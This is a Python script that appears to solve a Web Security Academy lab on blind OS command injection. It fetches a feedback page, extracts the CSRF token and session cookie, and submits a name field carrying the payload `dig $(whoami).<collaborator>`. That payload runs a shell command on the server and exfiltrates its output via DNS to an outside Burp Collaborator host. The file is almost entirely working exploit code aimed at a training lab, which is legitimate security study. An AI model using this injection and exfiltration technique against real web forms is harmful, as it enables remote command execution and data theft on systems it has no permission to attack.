###################################################################################
#
# Author: Ahmed Elqalawy (@elqal3awii)
#
# Date: 10/10/2023
#
# Lab: Blind OS command injection with out-of-band data exfiltration
#
# Steps: 1. Fetch the feedback page
#        2. Extract csrf token and session cookie
#        3. Inject payload into the name field when submitting a feedback
#           to execute the `whoami` command and exfiltrate the output via
#           a DNS query to burp collaborator.
#        4. Check your burp collaborator for the output of the `whoami` command
#
###################################################################################


###########
# imports
###########
import requests
from colorama import Fore
import re


#########
# Main
#########

# change this to your lab URL
url = "https://0a4300db04f3e14f847af0370098005d.web-security-academy.net" 

# change this to your collaborator domain
collaborator = "nyp4hfkvxkzpg7jqtodl1c58hznqbiz7.oastify.com"

print(Fore.BLUE + "⟪#⟫ Injection point: " + Fore.YELLOW + "name")

try:
    # fetch the feedback page
    injection = requests.get(f"{url}/feedback")
    
except:
    print(Fore.RED + "[!] Failed to fetch the feedback page through exception")
    exit(1)

print(Fore.WHITE + "⦗1⦘ Fetching the feedback page.. " + Fore.GREEN + "OK")

# get session cookie
session = injection.cookies.get("session")

# extract the csrf token
csrf = re.findall("csrf.+value=\"(.+)\"", injection.text)[0]

print(Fore.WHITE + "⦗2⦘ Extracting csrf token and session cookie.. " + Fore.GREEN + "OK")

# the payload to execute the `whoami` command and exfiltrate the output via a DNS query to burp collaborator
payload = f"`dig $(whoami).{collaborator}`"

# set session cookie
cookies ={
    "session": session
}

# data to send via POST
data = {
    "csrf": csrf,
    "name": payload,
    "email": "no@hack.com",
    "subject": "hacking",
    "message": "you are hacked",
}

try:
    # fetch the page with the injected payload
    injection = requests.post(f"{url}/feedback/submit", data, cookies=cookies)
    
except:
    print(Fore.RED + "[!] Failed to fetch the page with the injected payload through exception")
    exit(1)

print(Fore.WHITE + "⦗3⦘ Injecting payload to execute the `whoami` command and exfiltrate the output via a DNS query to burp collaborator.. " +  Fore.GREEN + "OK")
print(Fore.WHITE + "🗹 Check your burp collaborator for the output of the `whoami` command then submit the answer")



